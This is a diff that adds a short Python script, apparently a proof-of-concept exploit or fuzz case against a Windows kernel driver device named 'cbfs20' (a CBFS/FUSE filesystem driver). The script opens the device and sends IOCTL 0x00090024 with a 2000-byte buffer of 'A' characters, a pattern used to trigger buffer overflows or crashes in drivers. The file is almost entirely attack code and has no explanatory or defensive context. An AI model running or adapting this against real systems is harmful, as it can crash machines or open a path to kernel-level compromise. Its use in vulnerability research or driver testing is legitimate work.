@@ -1,0 +1,25 @@
+import ctypes, sys
+from ctypes import *
+import io
+from itertools import product
+from sys import argv
+
+devicename = "fuse20,cbfs20"
+
+ioctl = 0x00090024
+
+
+kernel32 = windll.kernel32
+hevDevice = kernel32.CreateFileA("\\\\.\\cbfs20", 0xC0000000, 0, None, 0x3, 0, None) 
+
+if not hevDevice or hevDevice == -1:
+    print ("Plz run admin privilege.")
+
+else:
+    print ("OPENED!")
+                    
+    buf = 'A' * 2000
+    bufLength = 2000
+    
+    kernel32.DeviceIoControl(hevDevice, ioctl, buf, bufLength, None, 0, byref(c_ulong()), None)
+
